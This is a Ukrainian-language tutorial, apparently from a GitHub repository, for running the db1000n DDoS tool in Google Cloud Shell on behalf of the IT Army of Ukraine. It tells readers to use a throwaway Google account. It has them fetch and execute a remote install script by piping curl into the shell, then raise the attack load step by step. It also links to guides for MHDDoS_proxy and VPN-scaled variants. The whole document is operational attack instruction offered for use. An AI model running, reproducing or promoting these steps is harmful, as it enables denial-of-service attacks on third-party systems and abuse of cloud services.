#   Все буде Україна! 💙💛

**Привіт друзі!**   

***Не використовуйте ваш персональний аккаунт з яким ви працюєте.***  
Інструкція  [як створити новий обліковий запис Google](https://support.google.com/accounts/answer/27441?hl=uk)

**☁️ Cloud Shell** зараз працє в ***ефемерному режимі***. Це означає, що все створене під час цього сеансу видалиться разом з віртуальною машиною **після закінчення даного сеансу**.

Якщо з'єднання перервано не підключайтесь повторно бо вийдете з ***ефемерного режиму***, а **завантажтесь знову**, натиснувши кнопку розташовану нижче

[![Open in Cloud Shell](https://telegra.ph/file/22b02a59993bd344b2bc9.png)](https://console.cloud.google.com/cloudshell/editor?cloudshell=true&shellonly=true&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=tutorial.md)

## Давайте запустимо «Death by 1000 needles» db1000n. 
З початку скопіюйте команду розташовану нижче та натисніть клавішу [ENTER] 👇
```bash
cd ~/ && source <(curl https://raw.githubusercontent.com/patatakartata/Cloud_Shell_DDoS/main/install.sh)
```
### Чудово, процес пішов!
Якщо все працює без ***роз'єднань***, можна підвищити потужність. Для цього зупиніть процес натиснувши Ctrl+C, та запустіть команду зі збілшеним навантаженням розташовану нижче 👇
```bash
./db1000n --scale 0.7
```
або ще з більшим навантаженням 👇
```bash
./db1000n
```
#### Для перевірки навантаження на процесор використаємо команду htop
Для цього додайте ще один термінал натиснувши "**+**" праворуч від заголовка працюючого терміналу, та запустіть наступну команду 👇
```bash
htop -F ./db
```
##### ***Пропоную для ознайомлення:***
* Натисніть на кнопку щоб завантажити новий сеанс Google Cloud Shell з інструкцією по запуску **MHDDoS_proxy**.

[![Open in Cloud Shell](https://telegra.ph/file/22b02a59993bd344b2bc9.png)](https://console.cloud.google.com/cloudshell/editor?cloudshell=true&shellonly=true&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=mhddos_proxy_tutorial.md)
* Інструкція для початківців 👉 [Як запустити «Death by 1000 needles» (db1000n) в Google Cloud Shell](https://telegra.ph/YAk-zapustiti-dvanadcyat-ekzemplyar%D1%96v-Death-by-1000-needles-db1000n-v-Google-Cloud-Shell-ne-vikoristovuyuchi-VPN-05-04)
* Інструкція для більш досвідчених 👉 [Як запустити потужний Db1000nX100 з використанням VPN в Google Cloud Shell](https://telegra.ph/Zapusk-Db1000nX100-u-Google-Cloud-Shell-05-20)
* Офіційна сторінка   [⚡ It Army of Ukraine ⚡](https://itarmy.com.ua/)  має багато корисної інформації
